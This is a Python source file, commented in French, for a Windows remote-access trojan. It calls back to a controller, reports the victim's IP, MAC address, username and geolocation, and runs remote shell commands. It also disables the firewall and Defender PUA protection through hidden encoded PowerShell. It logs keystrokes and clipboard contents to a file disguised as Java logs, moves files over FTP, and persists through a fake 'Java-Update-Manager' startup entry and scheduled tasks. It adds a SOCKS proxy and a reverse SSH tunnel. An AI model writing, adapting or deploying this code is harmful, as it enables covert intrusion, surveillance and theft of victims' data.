import socket #<RANDOMSTRING>
import os #<RANDOMSTRING>
import subprocess #<RANDOMSTRING>
from ctypes import * #<RANDOMSTRING>
import pythoncom #<RANDOMSTRING>
import pyHook #<RANDOMSTRING>
import ctypes  #<RANDOMSTRING>
import win32clipboard #<RANDOMSTRING>
from win32com.makegw.makegwparse import * #<RANDOMSTRING>
import threading
import inspect #<RANDOMSTRING>
import sys
import time #<RANDOMSTRING>
import random #<RANDOMSTRING>
import string
from ftplib import FTP
import asyncio #<RANDOMSTRING>
import pproxy
import getpass #<RANDOMSTRING>
import select
from optparse import OptionParser
import paramiko #<RANDOMSTRING>
# pour la compil
import imp
 #<RANDOMSTRING>
def get_or_create_eventloop(): #<RANDOMSTRING>
    try:
        return asyncio.get_event_loop() #<RANDOMSTRING>
    except RuntimeError as ex:
        if "There is no current event loop in thread" in str(ex):
            loop = asyncio.new_event_loop() #<RANDOMSTRING>
            asyncio.set_event_loop(loop)
            return asyncio.get_event_loop() #<RANDOMSTRING>

def getString(length=6): #<RANDOMSTRING>
    """Générer une chaîne aléatoire de longueur fixe"""
    str = string.ascii_lowercase #<RANDOMSTRING>
    return ''.join(random.choice(str) for i in range(length))

def _async_raise(tid, exctype): #<RANDOMSTRING>
    """raises the exception, performs cleanup if needed"""
    tid = ctypes.c_long(tid) #<RANDOMSTRING>
    if not inspect.isclass(exctype):
        exctype = type(exctype) #<RANDOMSTRING>
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(
        tid, ctypes.py_object(exctype)) #<RANDOMSTRING>
    if res == 0: #<RANDOMSTRING>
        raise ValueError("invalid thread id")
    elif res != 1:
        # """if it returns a number greater than one, you're in trouble,
        # and you should call it again with exc=NULL to revert the effect"""
        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
        raise SystemError("PyThreadState_SetAsyncExc failed") #<RANDOMSTRING>


class Threads:
 #<RANDOMSTRING>
    thread_id = 0
    thread_name = "null" #<RANDOMSTRING>

    def StartThread(self, fonction, arg1="", arg2=""): #<RANDOMSTRING>
        if "Keylogger" in fonction:
            thread = threading.Thread(target=keylog.Keylog, name=fonction) #<RANDOMSTRING>
            thread.start()
        if "Commande" in fonction: #<RANDOMSTRING>
            thread = threading.Thread(
                target=payload.Commande, name=fonction, args=(arg1,))
            thread.start()
        if "Proxy" in fonction: #<RANDOMSTRING>
            thread = threading.Thread(
                target=payload.StartProxy, name=fonction, args=(arg1,))
            thread.start()
        if "Tunnel" in fonction: #<RANDOMSTRING>
            thread = threading.Thread(
                target=payload.StartTunnel, name=fonction, args=(arg1,arg2)) #<RANDOMSTRING>
            thread.start()
        self.thread_id = thread.ident #<RANDOMSTRING>
        self.thread_name = thread.name
        
 #<RANDOMSTRING>
    def StopThread(self):
        print("Arret du Thread : " + self.thread_name +
              ", numéro : " + str(self.thread_id)) #<RANDOMSTRING>
        _async_raise(self.thread_id, SystemExit)
 #<RANDOMSTRING>

class Payload:

    host = '127.0.0.1'
    port = 4444
    user_SSH = "user"
    password_SSH = "passtest"
    name_proc = "default"

    SEPARATOR = "<sep>"
    BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase #<RANDOMSTRING>

    keylogger_mode = "null"
 #<RANDOMSTRING>
    result_commande = ""

    appdata = os.path.expandvars("%AppData%")
    path_keylog = appdata + "/java_logs.txt" #<RANDOMSTRING>

    def run(self):
        inf = Info()
        ## si on a les droit admin 
        # on desactive le parfeux #<RANDOMSTRING>
        if inf.administrator():
            cmd = "netsh advfirewall set allprofiles state off"
            self.Commande(cmd)
            self.ExeptionDefenderProc(self.name_proc)
        while True:
            conn_ok = False #<RANDOMSTRING>
            ClientSocket = socket.socket()
            print('Waiting for connection') #<RANDOMSTRING>
            name = None
            while conn_ok == False:
 #<RANDOMSTRING>
                try:
                    ClientSocket.connect((self.host, self.port)) #<RANDOMSTRING>
                    conn_ok = True
                except socket.error as e:
                    print(str(e))
                    conn_ok = False #<RANDOMSTRING>
                    time.sleep(5 * 60)
            print("Connexion Ok") #<RANDOMSTRING>
            cwd = os.getcwd()
            ClientSocket.send(cwd.encode()) #<RANDOMSTRING>
            info = [inf.platform(), inf.public_ip(), inf.local_ip(), inf.mac_address(),
                    inf.architecture(), inf.device(), inf.username(), inf.administrator(), inf.geolocation(), inf.ipv4(inf.local_ip())]
            message = f"{info[0]}{self.SEPARATOR}{info[1]}{self.SEPARATOR}{info[2]}{self.SEPARATOR}\
            {info[3]}{self.SEPARATOR}{info[4]}{self.SEPARATOR}{info[5]}{self.SEPARATOR}{info[6]}{self.SEPARATOR}\
            {info[7]}{self.SEPARATOR}{info[8]}{self.SEPARATOR}{info[9]}" #<RANDOMSTRING>
            ClientSocket.send(message.encode())
 #<RANDOMSTRING>
            ## attend des info supplementaire

            try:
                rep = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                if rep != "RAS":
                    name = rep #<RANDOMSTRING>
            except socket.error as e:
                print(str(e)) #<RANDOMSTRING>
                break

            pers = Persistance() #<RANDOMSTRING>

            # AJOUTER LE NUMERO DE SESSION DANS LES INFO

            ##############

            ## boucle du client ##

            while True: #<RANDOMSTRING>
                # receive the command from the server
                try:
                    command = ClientSocket.recv(
                        self.BUFFER_SIZE).decode('utf-8', "ignore")
                except socket.error as e:
                    print(str(e)) #<RANDOMSTRING>
                    break
                #command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
                splited_command = command.split()
                print(command) #<RANDOMSTRING>
                #output = subprocess.getoutput(command)
                # ClientSocket.send(str.encode(output))
                if command.lower() != "cat":
 #<RANDOMSTRING>
                    if splited_command[0].lower() == "cat":
                        path_fichier = splited_command[1] #<RANDOMSTRING>
                        output = self.Commande("type " + path_fichier)

                else:
                    output = "Cat a besoin d'une option"
 #<RANDOMSTRING>
                if len(splited_command) == 1 and splited_command[0].lower() == "proxy": #<RANDOMSTRING>
                    print("Lancement du proxy sur le port par défault (9050)")
                    self.LaunchThread("Proxy", 9050) #<RANDOMSTRING>
                    output = "Lancement du proxy sur le port par défault (9050)"
                elif len(splited_command) == 2 and splited_command[0].lower() == "proxy": #<RANDOMSTRING>
                    if splited_command[1].isnumeric():
                        print("Lancement du proxy sur le port : " + splited_command[1]) #<RANDOMSTRING>
                        self.LaunchThread("Proxy", int(splited_command[1]))
                        output = "Lancement du proxy sur le port : " + splited_command[1] #<RANDOMSTRING>
                    else:
                        print("Ereur dans l'option du proxy. exemple de la commande : proxy 9050(port d'écoute du serveur proxy)")
                        output = "Ereur dans l'option du proxy. exemple de la commande : proxy 9050(port d'écoute du serveur proxy)"
 #<RANDOMSTRING>
                if len(splited_command) == 1 and splited_command[0].lower() == "tunnel": #<RANDOMSTRING>
                    print("Ouverture du tunnel sur le port remote par défault (9051) vers le port local par défault (9050)")
                    self.LaunchThread("Tunnel", 9051, 9050)
                    output = "Ouverture du tunnel sur le port remote par défault (9051) vers le port local par défault (9050)"
                elif len(splited_command) == 2 and splited_command[0].lower() == "tunnel": #<RANDOMSTRING>
                    print("Le tunnel nésaisite 2 port en option")
                    output = "Le tunnel nésaisite 2 port en option"
                    
                elif len(splited_command) == 3 and splited_command[0].lower() == "tunnel": #<RANDOMSTRING>
                    if splited_command[1].isnumeric() and splited_command[2].isnumeric():
                        print("Ouverture du tunnel sur le port remote {} vers le port local {}".format(splited_command[1], splited_command[2]))
                        self.LaunchThread("Tunnel", int(splited_command[1]), int(splited_command[2]))
                        output = "Ouverture du tunnel sur le port remote {} vers le port local {}".format(splited_command[1], splited_command[2])
                    else: #<RANDOMSTRING>
                        print("Ereur dans les options. exemple de la commande : tunnel 9051(entrer du tunnel) 9050 (sorti du tunnel)")
                        output = "Ereur dans les options. exemple de la commande : tunnel 9051(entrer du tunnel) 9050 (sorti du tunnel)"

                elif len(splited_command) > 3 and splited_command[0].lower() == "tunnel":
                    print("Tunnel a trop d'options")
                    output = "Tunnel a trop d'options" #<RANDOMSTRING>

                if command.lower() != "download":

                    if splited_command[0].lower() == "download": #<RANDOMSTRING>
                        #print("tentative de telechargelent de " + splited_command[1] + " " + self.host + " " + str((self.port+2)))
                        path_fichier = splited_command[1]
                        ftp = FTP('')
                        ftp.connect(self.host, (self.port+2))
                        ftp.login(user='user', passwd = '12345')
                        fichier = path_fichier
                        try:
                            file = open(fichier, 'rb') # ici, j'ouvre le fichier ftp.py  #<RANDOMSTRING>
                            try:
                                ftp.storbinary('STOR '+fichier, file) # ici (où connect est encore la variable de la connexion), j'indique le fichier à envoyer
                                output = "Fichier recupérer" #<RANDOMSTRING>
                            except:
                                output = "Erreur le fichier n'a pas été récuperé"
                        except:
                            output = "Le fichier n'éxiste pas"
                        file.close() # on ferme le fichier #<RANDOMSTRING>
                else:
                    output = "Download a besoin d'une option" #<RANDOMSTRING>

                if command.lower() != "upload":

                    if splited_command[0].lower() == "upload":
                        path_fichier = splited_command[1]
                        ftp = FTP('') #<RANDOMSTRING>
                        #ftp.set_pasv(True)
                        ftp.connect(self.host, (self.port+2)) 
                        ftp.login(user='user', passwd = '12345')
                        fichier = path_fichier
                        try: #<RANDOMSTRING>
                            file = open(fichier, 'wb')
                            try:
                                ftp.retrbinary('RETR '+fichier, file.write) #<RANDOMSTRING>
                                ftp.delete(fichier)
                                output = "Fichier uploader"
                            except:
                                output = "Erreur le fichier n'a pas été uploader"
                        except: #<RANDOMSTRING>
                            output = "Erreur le fichier ne peut pas etre ecrit sur le disque"
                        file.close() # on ferme le fichier
                else: #<RANDOMSTRING>
                    output = "Upload a besoin d'une option"

                if command.lower() != "keylogger":

                    if splited_command[0].lower() == "keylogger": #<RANDOMSTRING>

                        if splited_command[1].lower() == "run" and self.keylogger_mode != "run":
                            # run le keylogger
                            if self.keylogger_mode == "null":
                                self.keylogger_mode = "run" #<RANDOMSTRING>
                                output = "Keylogger Activé"
                                # lance un thread de keylog
                                thread_keylog = Threads() #<RANDOMSTRING>
                                thread_keylog.StartThread("Keylogger")
                            elif self.keylogger_mode == "stop": #<RANDOMSTRING>
                                self.keylogger_mode = "run"
                                output = "Keylogger Activé"
                        elif splited_command[1].lower() == "run" and self.keylogger_mode != "run":
                            output = "Keylogger déja Activé"
 #<RANDOMSTRING>
                        elif splited_command[1].lower() == "status":
                            # envoyer retour du keylogger #<RANDOMSTRING>
                            #self.keylogger_mode = "status"
                            file = open(self.path_keylog, 'r')
                            logs = file.read()
                            file.close() #<RANDOMSTRING>
                            output = logs

                        elif splited_command[1].lower() == "stop": #<RANDOMSTRING>
                            # run le keylogger
                            self.keylogger_mode = "stop"
                            # thread_keylog.StopThread()
                            output = "Keylogger Desactivé" #<RANDOMSTRING>

                else:
                    output = "Keylogger a besoin d'une option" #<RANDOMSTRING>

                if command.lower() != "persistance":

                    if splited_command[0].lower() == "persistance": #<RANDOMSTRING>

                        if splited_command[1].lower() == "auto": #<RANDOMSTRING>
                            print("Persistance automatique")
                            output = "Persistance automatique"

                        elif splited_command[1].lower() == "startup": #<RANDOMSTRING>
                            result, code = pers._add_startup_file()
                            if result == False and code == "deja mise":
                                print("Persistance via dossier startup déja activé") #<RANDOMSTRING>
                                output = "Persistance via dossier startup déja activé"
                            if result == False and code == "error": #<RANDOMSTRING>
                                print(
                                    "Persistance via dossier startup a rencontrer une erreur")
                                output = "Persistance via dossier startup a rencontrer une erreur" #<RANDOMSTRING>
                            if result == True:
                                print("Persistance via dossier startup activé") #<RANDOMSTRING>
                                output = "Persistance via dossier startup activé"
 #<RANDOMSTRING>
                        elif splited_command[1].lower() == "powershell":
                            print("Persistance via powershell")
                            output = "Persistance via powershell" #<RANDOMSTRING>
 #<RANDOMSTRING>
                        elif splited_command[1].lower() == "task":
                            print("Persistance via tache planifié")
                            print(name) #<RANDOMSTRING>
                            if name == None:
                                result, code = pers._add_scheduled_task()
                            else:
                                result, code = pers._add_scheduled_task(name=name) #<RANDOMSTRING>
                            if result == True:
                                print("Persistance via tache planifié activé") #<RANDOMSTRING>
                                output = "Persistance tache planifié activé" + code
                                name = code #<RANDOMSTRING>
                                print(code)
                            if result == False: #<RANDOMSTRING>
                                print(
                                    "Persistance via tache planifié a rencontrer une erreur") #<RANDOMSTRING>
                                output = "Persistance tache planifié a rencontrer une erreur : " + code

                else: #<RANDOMSTRING>
                    output = "Persistance a besoin d'une option"

                if command.lower() == "kill": #<RANDOMSTRING>
                    # si la commande est kill, ferme le programmes
                    os._exit(0)
                if splited_command[0].lower() == "cd": #<RANDOMSTRING>
                    # cd command, change directory
                    try:
                        os.chdir(' '.join(splited_command[1:]))
                    except FileNotFoundError as e:
                        # if there is an error, set as the output #<RANDOMSTRING>
                        output = str(e)
                    else:
                        # if operation is successful, empty message #<RANDOMSTRING>
                        output = ""
                elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance" \
                    and splited_command[0].lower() != "cat" and splited_command[0].lower() != "download" \
                        and splited_command[0].lower() != "upload" and splited_command[0].lower() != "proxy" \
                            and splited_command[0].lower() != "tunnel": #<RANDOMSTRING>
                    # execute the command and retrieve the results

                    """
                    thread = threading.Thread(target=Commande, args=(command,))
                    thread.start()
                    thread.join()
                    """

                    output = self.Commande(command) #<RANDOMSTRING>

                    print("commande effectuer")
                    """"
                    resCmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
                    output, err = resCmd.communicate()
                    output = output.decode('cp850')
                    """

                # get the current working directory as output #<RANDOMSTRING>
                cwd = os.getcwd()
                # send the results back to the server
                message = f"{output}{self.SEPARATOR}{cwd}" #<RANDOMSTRING>
                ClientSocket.send(message.encode('utf-8'))
                print("Resultat Envoyer") #<RANDOMSTRING>

                #Input = input('Say Something: ')
                # ClientSocket.send(str.encode(Input))
                #Response = ClientSocket.recv(1024)
                # print(Response.decode('utf-8'))

            ## Fin de Connection ##
 #<RANDOMSTRING>
            ClientSocket.close()

    def LaunchThread(self, fonction, arg1="", arg2=""): #<RANDOMSTRING>
        print(fonction)
        t = Threads()
        t.StartThread(fonction, arg1, arg2)
        return t
 #<RANDOMSTRING>
    def Commande(self, cmd):
        resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                  stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
        output, err = resCmd.communicate()
        output = output.decode('cp850') #<RANDOMSTRING>
        payload.result_commande = output
        return output #<RANDOMSTRING>

    def powershell(self, code):
        """
        Execute code in Powershell.exe and return any results
        `Required`
        :param str code:      script block of Powershell code
        Returns any output from Powershell executing the code
        """
        import os
        import base64
        try:
            powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe') else os.popen('where powershell').read().rstrip()
            encoded_bytes = base64.b64encode(code.encode('utf-16-le'))
            encoded_string = str(encoded_bytes, 'utf-8')
            cmd = '{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, encoded_string)
            result = self.Commande(cmd)
            return result
        except Exception as e:
            print("error: {}".format(str(e)))

    def ExeptionDefenderProc(self, proc):
        #cmd = "Add-MpPreference -ExclusionProcess {}".format(name_proc)Set-MpPreference -PUAProtection 0
        cmd = "Set-MpPreference -PUAProtection 0"
        self.powershell(cmd)

    def StartProxy(self, port):
        ADDR = "0.0.0.0"
        PORT = port #<RANDOMSTRING>

        server = pproxy.Server('http+socks4+socks5://{}:{}'.format(ADDR ,str(PORT)))
        remote = pproxy.Connection('direct') #<RANDOMSTRING>
        args = dict( rserver = [remote],
                    verbose = print ) #<RANDOMSTRING>

        loop = get_or_create_eventloop()
        handler = loop.run_until_complete(server.start_server(args)) #<RANDOMSTRING>
        try:
            print("Lancement du serveur proxy sur : {}:{}".format(ADDR ,str(PORT)))
            loop.run_forever() #<RANDOMSTRING>
        except KeyboardInterrupt:
            print('exit!')
 #<RANDOMSTRING>
        handler.close()
        loop.run_until_complete(handler.wait_closed())
        loop.run_until_complete(loop.shutdown_asyncgens())
        loop.close() #<RANDOMSTRING>

    def StartTunnel(self, port_entrer, port_sorti):

        SSH_PORT = 22 #<RANDOMSTRING>
        DEFAULT_PORT = port_entrer

        g_verbose = True
 #<RANDOMSTRING>

        def handler(chan, host, port):
            sock = socket.socket()
            try: #<RANDOMSTRING>
                sock.connect((host, port))
            except Exception as e:
                verbose("Forwarding request to %s:%d failed: %r" % (host, port, e))
                return

            verbose(
                "Connected!  Tunnel open %r -> %r -> %r"
                % (chan.origin_addr, chan.getpeername(), (host, port)) #<RANDOMSTRING>
            )
            while True:
                r, w, x = select.select([sock, chan], [], [])
                if sock in r: #<RANDOMSTRING>
                    data = sock.recv(1024)
                    if len(data) == 0:
                        break #<RANDOMSTRING>
                    chan.send(data)
                if chan in r:
                    data = chan.recv(1024) #<RANDOMSTRING>
                    if len(data) == 0:
                        break
                    sock.send(data)
            chan.close()
            sock.close() #<RANDOMSTRING>
            verbose("Tunnel closed from %r" % (chan.origin_addr,))


        def reverse_forward_tunnel(server_port, remote_host, remote_port, transport): #<RANDOMSTRING>
            transport.request_port_forward("", server_port)
            while True:
                chan = transport.accept(1000)
                if chan is None:
                    continue #<RANDOMSTRING>
                thr = threading.Thread(
                    target=handler, args=(chan, remote_host, remote_port)
                )
                thr.setDaemon(True)
                thr.start()


        def verbose(s):
            if g_verbose:
                print(s)


        HELP = """\
        Set up a reverse forwarding tunnel across an SSH server, using paramiko. A
        port on the SSH server (given with -p) is forwarded across an SSH session
        back to the local machine, and out to a remote site reachable from this
        network. This is similar to the openssh -R option.
        """


        def get_host_port(spec, default_port):
            "parse 'hostname:22' into a host and port, with the port optional"
            args = (spec.split(":", 1) + [default_port])[:2]
            args[1] = int(args[1])
            return args[0], args[1]


        def parse_options():
            global g_verbose

            parser = OptionParser(
                usage="usage: %prog [options] <ssh-server>[:<server-port>]",
                version="%prog 1.0",
                description=HELP,
            )
            parser.add_option(
                "-q",
                "--quiet",
                action="store_false",
                dest="verbose",
                default=True,
                help="squelch all informational output",
            )
            parser.add_option(
                "-p",
                "--remote-port",
                action="store",
                type="int",
                dest="port",
                default=DEFAULT_PORT,
                help="port on server to forward (default: %d)" % DEFAULT_PORT,
            )
            parser.add_option(
                "-u",
                "--user",
                action="store",
                type="string",
                dest="user",
                default=self.user_SSH,
                help="username for SSH authentication (default: %s)"
                % "theoc",
            )
            parser.add_option(
                "-K",
                "--key",
                action="store",
                type="string",
                dest="keyfile",
                default=None,
                help="private key file to use for SSH authentication",
            )
            parser.add_option(
                "",
                "--no-key",
                action="store_false",
                dest="look_for_keys",
                default=True,
                help="don't look for or use a private key file",
            )
            parser.add_option(
                "-P",
                "--password",
                action="store_true",
                dest="readpass",
                default=False,
                help="read password (for key or password auth) from stdin",
            )
            parser.add_option(
                "-r",
                "--remote",
                action="store",
                type="string",
                dest="remote",
                default=1234,
                metavar="host:port",
                help="remote host and port to forward to",
            )
            options, args = parser.parse_args()

            #if len(args) != 1:
                #parser.error("Incorrect number of arguments.")
            #if options.remote is None:
                #parser.error("Remote address required (-r).")

            g_verbose = options.verbose
            server_host, server_port = (self.host, SSH_PORT)
            remote_host, remote_port = ("127.0.0.1", port_sorti)
            return options, (server_host, server_port), (remote_host, remote_port)


        def main():
            options, server, remote = parse_options()

            password = self.password_SSH
            #if options.readpass:
                #password = getpass.getpass("Enter SSH password: ")

            client = paramiko.SSHClient()
            client.load_system_host_keys()
            client.set_missing_host_key_policy(paramiko.WarningPolicy())

            verbose("Connecting to ssh host %s:%d ..." % (server[0], server[1]))
            try:
                client.connect(
                    server[0],
                    server[1],
                    username=options.user,
                    key_filename=options.keyfile,
                    look_for_keys=options.look_for_keys,
                    password=password,
                )
            except Exception as e:
                print("*** Failed to connect to %s:%d: %r" % (server[0], server[1], e))
                sys.exit(1)

            verbose(
                "Now forwarding remote port %d to %s:%d ..."
                % (options.port, remote[0], remote[1])
            )

            try:
                reverse_forward_tunnel(
                    options.port, remote[0], remote[1], client.get_transport()
                )
            except KeyboardInterrupt:
                print("C-c: Port forwarding stopped.")
                sys.exit(0)


        if __name__ == "__main__":
            main()



class Keylogger:

    user32 = windll.user32
    kernel32 = windll.kernel32
    psapi = windll.psapi
    current_window = None
    appdata = os.path.expandvars("%AppData%")
    path_keylog = appdata + "/java_logs.txt"

    def Keylog(self):

        # create and register a hook manager
        k1 = pyHook.HookManager()
        k1.KeyDown = self.Keystroke
        # register the hook and execute forever
        k1.HookKeyboard()
        pythoncom.PumpMessages()
        print("Fin du keylogger")

        ## Fonction keylloger ##

    def get_current_process(self):
        # Get a handle to the foreground window
        hwnd = self.user32.GetForegroundWindow()
        print("hwnd", hwnd)
        # Find Process id
        pid = c_ulong()
        print("pid", pid)
        self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        # store the current process ID
        process_id = pid.value
        print("processid", process_id)
        # grab the executable
        executable = create_string_buffer(b'\x00', 512)
        h_process = self.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        self.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        # now read its title
        window_title = create_string_buffer(b"\x00", 512)
        print(window_title, executable, process_id, hwnd)
        length = self.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        # w = win32gui
        # z=w.GetWindowText(w.GetForegroundWindow())
        # print out the header if we're in the right process
        print()
        print("PID : %s - %s - %s" %
              (process_id, executable.value, window_title.value))
        var = "PID : %s - %s - %s" % (process_id,
                                      executable.value, window_title.value)
        file = open(self.path_keylog, 'a')
        file.write("\n%s\n" % var)
        file.close()
        print()
        # close handles
        self.kernel32.CloseHandle(hwnd)
        self.kernel32.CloseHandle(h_process)

    def Keystroke(self, event):
        # Couper le keylogger
        if payload.keylogger_mode == "stop":
            """
            pid = os.getpid()
            resCmd = subprocess.Popen("taskkill /F /PID " + str(pid), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
            output, err = resCmd.communicate()
            output = output.decode('cp850')
            print(output)
            """
            # ctypes.windll.self.user32.PostQuitMessage(0)
            return True
            # exit()
        # check to see if target changed windows
        if event.WindowName != self.current_window:
            self.current_window = event.WindowName
            self.get_current_process()
        # if they pressed a standard key
        if event.Ascii in range(32, 128):
            print(chr(event.Ascii))
            h = chr(event.Ascii)
            file = open(self.path_keylog, 'a')
            file.write("%s" % h)
            file.close()
        else:
            # if [CTRL-V] ,get the value on the clipboard
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print("[PASTE] - {0}".format(pasted_value))
                file = open(self.path_keylog, 'a')
                file.write("\n[PASTE] - {0}\n".format(pasted_value))
                file.close()
            else:
                print("{0}".format(event.Key))
                file = open(self.path_keylog, 'a')
                file.write("{0}".format(event.Key))
                file.close()
        # pass execution to next hook registered
        return True


class Persistance:

    def _add_startup_file(self, value=None, name='Java-Update-Manager'):
        try:
            if os.name == 'nt':
                value = sys.argv[0]
                if value and os.path.isfile(value):
                    appdata = os.path.expandvars("%AppData%")
                    startup_dir = os.path.join(
                        appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
                    if not os.path.exists(startup_dir):
                        os.makedirs(startup_dir)
                    startup_file = os.path.join(
                        startup_dir, '%s.eu.url' % name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
                        with open(startup_file, 'w') as fp:
                            print("persis mise")
                            fp.write(content)
                    else:
                        print("persis deja mise")
                        return (False, "deja mise")
                    return (True, startup_file)
        except Exception as e:
            print('{} error: {}'.format(self._add_startup_file.__name__, str(e)))
        return (False, "error")

    def _add_scheduled_task(self, value=None, name=None):
        try:
            value = sys.argv[0]
            if name == None:
                name  = getString(random.randint(6,11))
            if value and os.path.isfile(value):
                result  = subprocess.check_output('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(name, value), shell=True)
                result = result.decode("cp850")
                if 'SUCCESS' in result or 'réussie' in result:
                    print(result)
                    return (True, name)
        except Exception as e:
            print('Add scheduled task error: {}'.format(str(e)))
            err = e
        return (False, "Erreur : " + err)


class Info:

    def platform(self):
        """
        Return the system platform of host machine
        """
        import sys
        return sys.platform

    def public_ip(self):
        """
        Return public IP address of host machine
        """
        import sys
        if sys.version_info[0] > 2:
            from urllib.request import urlopen
        else:
            from urllib import urlopen
        return urlopen('http://api.ipify.org').read()

    def local_ip(self):
        """
        Return local IP address of host machine
        """
        import socket
        return socket.gethostbyname(socket.gethostname())

    def mac_address(self):
        """
        Return MAC address of host machine
        """
        import uuid
        return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0, 11, 2)).upper()

    def architecture(self):
        """
        Check if host machine has 32-bit or 64-bit processor architecture
        """
        import struct
        return int(struct.calcsize('P') * 8)

    def device(self):
        """
        Return the name of the host machine
        """
        import socket
        return socket.getfqdn(socket.gethostname())

    def username(self):
        """
        Return username of current logged in user
        """
        import os
        return os.getenv('USER', os.getenv('USERNAME', 'user'))

    def administrator(self):
        """
        Return True if current user is administrator, otherwise False
        """
        import os
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin() if os.name == 'nt' else os.getuid() == 0)

    def geolocation(self):
        """
        Return latitute/longitude of host machine (tuple)
        """
        import sys
        import json
        if sys.version_info[0] > 2:
            from urllib.request import urlopen
        else:
            from urllib2 import urlopen
        response = urlopen('http://ipinfo.io').read()
        json_data = json.loads(response)
        latitude, longitude = json_data.get('loc').split(',')
        return (latitude, longitude)

    def ipv4(self, address):
        """
        Check if valid IPv4 address
        `Required`
        :param str address:   string to check
        Returns True if input is valid IPv4 address, otherwise False
        """
        import socket
        try:
            if socket.inet_aton(str(address)):
                return True
        except:
            return False


payload = Payload()
keylog = Keylogger()
payload.run()
